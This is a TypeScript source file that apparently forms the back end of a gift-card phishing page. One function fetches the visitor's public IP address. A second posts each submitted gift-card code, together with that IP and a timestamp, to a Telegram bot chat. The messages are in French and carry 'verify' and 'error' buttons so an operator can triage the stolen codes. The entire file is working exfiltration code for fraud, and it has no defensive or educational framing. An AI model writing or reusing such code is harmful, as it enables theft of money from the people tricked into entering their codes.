
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../constants';
import { TelegramResponse, IpInfo } from '../types';

/**
 * Fetches the user's public IP address safely with error handling.
 */
export async function fetchUserIp(): Promise<string> {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    if (!response.ok) throw new Error('IP fetch failed');
    const data: IpInfo = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error fetching IP:', error);
    return 'Unknown IP';
  }
}

/**
 * Sends gift card data to the configured Telegram bot.
 */
export async function sendToTelegram(code: string, ip: string): Promise<boolean> {
  const message = `
🔔 **Nouveau Code Reçu**
Code: \`${code}\`
IP: ${ip}
Time: ${new Date().toLocaleString()}
  `;

  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Vérification", callback_data: `v:${code}` },
          { text: "❌ Erreur", callback_data: `e:${code}` }
        ]
      ]
    }
  };

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data: TelegramResponse = await response.json();
    return data.ok;
  } catch (error) {
    console.error('Telegram API error:', error);
    return false;
  }
}
